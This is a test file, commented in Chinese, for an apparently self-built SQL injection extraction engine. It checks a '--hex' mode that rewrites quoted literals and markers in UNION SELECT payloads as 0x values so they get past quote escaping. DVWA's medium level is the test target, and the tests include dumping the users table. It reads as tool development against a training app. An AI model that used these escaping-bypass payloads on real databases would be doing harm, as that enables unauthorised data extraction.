// server/tests/extractor.hexDump.guard.test.js —— [D301 GAP①] --hex 提取链守卫。
// 背景：real_escape_string 全站逃逸目标（DVWA sqli medium 形态）上，提取链带引号标记
//（'__S__'/'__E__'）与模板字面量全被转义致死 ⇒ 拖库静默全空（all-levels 实测 0/5）。
// 判据：hex 开启 ⇒ payload 零引号 + 字面量 0x 化 + 提取语义不变；hex 关闭/方言不支持
// ⇒ payload 原样（零回归，不产出错误 SQL）。删 extractScalar 的 hexify 调用 ⇒ HEX-2 红。
import { test } from 'node:test';
import assert from 'node:assert/strict';
import Extractor from '../src/engine/Extractor.js';
import { hexifyStringLiterals } from '../src/engine/hexLiteral.js';

// 与 DVWA sqli medium 同构的模板段：SEPARATOR 与 WHERE 都带引号字面量
const SQL = "SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata WHERE schema_name NOT IN ('mysql')";

function makeCtx(dbms, config) {
  return {
    point: { id: 'p1', location: 'url', param: 'id', actionUrl: 'http://t/?id=1', originalValue: '1', boundary: '', columns: 2, echoCols: [1] },
    config: { ...config },
    dbms,
    httpClient: {},
  };
}

test('HEX-1 hexifyStringLiterals：全部引号字面量 0x 化，无引号残留', () => {
  const out = hexifyStringLiterals(SQL, 'MySQL');
  assert.ok(!out.includes("'"), 'hexify 后不得残留任何单引号（转义无从作用的核心判据）');
  assert.ok(out.includes('0x2C'), "SEPARATOR ',' → 0x2C");
  assert.ok(out.includes('0x6D7973716C'), "'mysql' → 0x6D7973716C");
  assert.ok(out.includes('SELECT GROUP_CONCAT'), '非字面量骨架保持原样');
});

test('HEX-2 extractScalar + hex:true：payload 零引号（转义无从作用），提取语义不变', async () => {
  const ex = new Extractor();
  const sends = [];
  ex._send = async (_ctx, value) => {
    sends.push(String(value));
    return { status: 200, data: '<pre>__S__dvwa__E__</pre>' };
  };
  const out = await ex.extractScalar(makeCtx('MySQL', { hex: true }), SQL, 2);
  assert.equal(out, 'dvwa', '标记提取语义不变（服务端把 0x 字面量按原文本回显）');
  const payload = sends.at(-1);
  assert.ok(payload.includes('UNION SELECT'), '最后一条 _send 是 UNION 提取 payload');
  assert.ok(!payload.includes("'"), 'hex 开启时 payload 不得含任何单引号（全站转义目标的核心判据）');
  assert.ok(payload.includes('0x5F5F535F5F'), "标记 '__S__' → 0x5F5F535F5F");
  assert.ok(payload.includes('0x5F5F455F5F'), "标记 '__E__' → 0x5F5F455F5F");
  assert.ok(payload.includes('0x2C'), "模板字面量 SEPARATOR ',' → 0x2C");
});

test('HEX-3 反例：hex 关闭（缺省）⇒ payload 原样带引号（零行为变化）', async () => {
  const ex = new Extractor();
  const sends = [];
  ex._send = async (_ctx, value) => {
    sends.push(String(value));
    return { status: 200, data: '<pre>__S__dvwa__E__</pre>' };
  };
  const out = await ex.extractScalar(makeCtx('MySQL', {}), SQL, 2);
  assert.equal(out, 'dvwa');
  assert.ok(sends.at(-1).includes("'__S__'"), 'hex 关闭时保持既有带引号形态');
});

test('HEX-4 反例：方言不支持（Oracle 无已验证 hex 写法）⇒ warn 后保持普通形态', async () => {
  const ex = new Extractor();
  const sends = [];
  ex._send = async (_ctx, value) => {
    sends.push(String(value));
    return { status: 200, data: null };
  };
  const out = await ex.extractScalar(makeCtx('Oracle', { hex: true }), SQL, 2);
  assert.equal(out, null, '提取失败如实为 null（不产出错误 SQL，不静默假装生效）');
  assert.ok(sends.at(-1).includes("'__S__'"), '不支持的方言保持普通形态');
});

test('HEX-5 hexifyStringLiterals 边界：未闭合尾巴原样保留 / 零字面量抛错 / 双引号并入内容', () => {
  assert.equal(hexifyStringLiterals("1' UNION -- -", 'MySQL'), "1' UNION -- -", '未闭合引号：payload 残片不得被吞');
  assert.throws(() => hexifyStringLiterals('SELECT 1', 'MySQL'), /没有可十六进制化/, '零字面量抛错让调用方把「--hex 未生效」喊出来');
  // '' 加倍转义：'o''brien' 整体是一个字面量，内容 o'brien → 0x6F 27 62 72 69 65 6E（引号由 27 字节承载）
  assert.equal(hexifyStringLiterals("WHERE name='o''brien'", 'MySQL'), 'WHERE name=0x6F27627269656E');
});

test('HEX-6 空字面量：IFNULL(...,\'\') 的 \'\' 不得转成裸 0x（DVWA medium 实测根因）', () => {
  // nnExpr 模板 IFNULL(CAST(`c` AS CHAR),'') 的空串回退：hex('') = 裸 0x 是语法错误
  //（真机实测 "Unknown column '0x'" ⇒ 全部 data 查询报错 ⇒ 拖库 0 行）。空串走 REPEAT(0x30,0)。
  const out = hexifyStringLiterals("SELECT IFNULL(CAST(`user` AS CHAR),'') FROM `dvwa`.`users`", 'MySQL');
  assert.ok(!out.includes("'"), '空串回退后 payload 仍零引号');
  assert.ok(!/0x(?![0-9A-Fa-f])/.test(out), '不得出现无数字的裸 0x（"Unknown column 0x" 根因）');
  assert.ok(out.includes('REPEAT(0x30,0)'), "空串转为 REPEAT(0x30,0)（语义等价 '' 且零引号）");
});
